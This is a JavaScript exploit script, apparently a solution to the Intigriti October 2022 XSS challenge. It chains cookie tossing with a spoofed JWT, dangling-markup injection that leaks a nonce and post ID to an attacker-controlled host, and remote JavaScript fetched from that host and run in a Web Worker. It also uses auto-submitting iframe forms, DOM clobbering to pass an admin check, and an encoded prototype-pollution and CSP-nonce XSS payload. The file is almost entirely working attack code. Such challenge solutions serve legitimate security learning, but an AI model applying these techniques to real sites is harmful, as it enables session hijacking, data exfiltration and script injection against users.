// Config
let exploit_base_url = 'https://inti.0xgodson.com';
let jwt_spoofed_attacker = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZmV5aGt1Znd2amVta2hqbnN3emEiLCJpYXQiOjE2NjYxMDY3OTN9.f7n2-S28C2xssNxYvvpJSdteLHIDO2ki7c5vzHU-KtA';

// Open the first post in frame for later use
function flagPost(cb) {
    const flagFrame = document.createElement('iframe');
    flagFrame.onload = function () {
        flagFrame.onload = null;
        setTimeout(cb, 1000);
    }
    flagFrame.id = 'flagFrame';
    flagFrame.srcdoc = `
        <script>
            window.open("${exploit_base_url}/flagFrame.html");
            location.replace("https://challenge-1022.intigriti.io/challenge/begin");
        </script>
    `;
    document.body.append(flagFrame)
}

// Create account to leak the nonce
function leakNonce(cb) {
    let random = (Math.random() + 1).toString(36).substring(7)

    const nonceFrame = document.createElement('iframe');
    nonceFrame.onload = function () {
        nonceFrame.onload = null;
        nonceFrame.contentDocument.forms[0].submit();
        cb();
    };
    nonceFrame.id = 'leakNonce'
    nonceFrame.srcdoc = `
        <form action="https://challenge-1022.intigriti.io/challenge/auth" method="POST">
            <input type="hidden" name="username" value="</title>${random}<img src='${exploit_base_url}/?leak=" />
            <input type="hidden" name="password" value="a" />
            <input type="submit" id="accountCreate" value="Submit request" />
        </form>
    `;
      setTimeout(()=>{document.body.append(nonceFrame)},2000);
}

// WebWorker to Leak the Secret!
function registerWorker(url, cb) {
    const worker = new Worker(url);
    worker.addEventListener('message', function (m) {
        const secret = m.data;
        console.log(`Found secret: '${secret}'`);
        cb(secret);
    });
}

// Get secret
function getSecret(cb) {
    setTimeout(()=>{
    fetch(`${exploit_base_url}/spoof.js`)
        .then(e => e.text())
        .then(e => {
            const blobUrl = URL.createObjectURL(new Blob([e], {type: 'text/javascript'}));
            registerWorker(blobUrl, cb); // passing Blob Url as URL to Bypass Browser restriction
        })},200);
}

// Create a dummy post to leak the PostID via dangling markup injection!
function createPost(secret, cb) {
    const dummyPostFrame = document.createElement('iframe');
    dummyPostFrame.onload = cb;
    dummyPostFrame.id = 'dummyPost';
    dummyPostFrame.srcdoc = `
        <form action="https://challenge-1022.intigriti.io/challenge/add" method="POST">
            <input type="hidden" name="title" value="Hacker" />
            <input type="hidden" name="secret" value="${secret}" />
            <input type="hidden" name="body" value="Hacker" />
            <input id=createPost type="submit" value="Submit request" />
        </form>
        <script>window.createPost.click();</script>
    `;
    setTimeout(()=>{document.body.append(dummyPostFrame)},1000);
}

// Get postId and nonce
function leakPostIdAndNonce(cb) {
    fetch(`${exploit_base_url}/result`)
        .then(res => res.json())
        .then(res => {
            console.log(`Leak completed. PostId: '${res.postId}'. Nonce: '${res.nonce}'`)
            cb(res.postId, res.nonce)
        });
}

// Frame the Post to leak the nonce
function framePost(postId, cb) {
    const postFrame = document.createElement('iframe');
    postFrame.onload = cb
    postFrame.id = 'postFrame';
    postFrame.src = `https://challenge-1022.intigriti.io/challenge/view/${postId}`;
    document.body.append(postFrame);
}


// Create final user to bypass admin check
function clobberUserType(cb) {
    const random = (Math.random() + 1).toString(36).substring(7)

    const finalUser = document.createElement('iframe');
    finalUser.onload = cb;
    finalUser.id = 'leakNonce';
    finalUser.srcdoc = `
        <form action="https://challenge-1022.intigriti.io/challenge/auth" method="POST">
            <input type="hidden" name="username" value="</title><html id=usertype type=admin>${random}" />
            <input type="hidden" name="password" value="a" />
            <input type="submit" id="accountCreate" value="Submit request" />
        </form>
        <script>window.accountCreate.click();</script>
    `;
    document.body.append(finalUser);
}

// Create xss post
function xssPost(secret, nonce, cb) {
    const xssPostFrame = document.createElement('iframe');
    xssPostFrame.onload = function () {
        setTimeout(cb, 1000);
    };
    xssPostFrame.id = 'dummyPost';
    xssPostFrame.srcdoc = `
        <form action="https://challenge-1022.intigriti.io/challenge/add" method="POST">
            <input type="hidden" name="title" value="xss" />
            <input type="hidden" name="secret" value="${secret}" />
            <input type="hidden" name="body" value="&lt;a&#32;href&#61;&quot;&#63;constructor&#91;prototype&#93;&#91;value&#93;&#61;admin&amp;constructor&#91;prototype&#93;&#91;markdown&#93;&#61;true&amp;constructor&#91;type&#93;&#61;admin&quot;&#32;id&#61;&quot;xssme&quot;&gt;click&#32;me&#33;&lt;&#47;a&gt;&lt;h1&#32;id&#61;&quot;&lt;mk&gt;&quot;&gt;&lt;&#47;h1&gt;&#96;&lt;h1&#32;id&#61;&quot;&#96;&lt;iframe&#32;srcdoc&#61;&apos;&lt;script&#32;nonce&#61;${nonce}&gt;alert&#40;top.window.frames&#x5b;0&#x5d;.window.noteContent.innerText&#41;&lt;&#47;script&gt;&apos;&gt;&lt;&#47;iframe&gt;&quot;&gt;payload&lt;&#47;h1&gt;&lt;h1&#32;id&#61;&quot;&lt;&#47;mk&gt;&quot;&gt;&lt;&#47;h1&gt;" />
            <input id=createPost type="submit" value="Submit request" />
        </form>
        <script>window.createPost.click();</script>
    `;
    document.body.append(xssPostFrame);
}

// Click xss post
function finalClicks() {
    const flagFrame = document.createElement('iframe');
    flagFrame.id = 'flagFrame';
    flagFrame.srcdoc = `
        <script>
            window.open("${exploit_base_url}/flagFrame.html");
            window.open("${exploit_base_url}/lastClick.html");
            location.replace("https://challenge-1022.intigriti.io/challenge/begin")
        </script>
     `;
    document.body.append(flagFrame);
}

// Setup
document.body.innerHTML = ''; // Clean the document.body
document.cookie = `jwt=${jwt_spoofed_attacker}; path=/challenge/theme; secure;domain=.intigriti.io`; // Cookie tossing to enable "theme" page for victim

// Exploit
flagPost(() => {
    leakNonce(() => {
        getSecret((secret) => {
            createPost(secret, () => {
                leakPostIdAndNonce((postId) => {
                    framePost(postId, () => {
                        leakPostIdAndNonce((postId, nonce) => {
                            clobberUserType(() => {
                                getSecret((secret) => {
                                    xssPost(secret, nonce, () => {
                                        finalClicks();
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    });
});

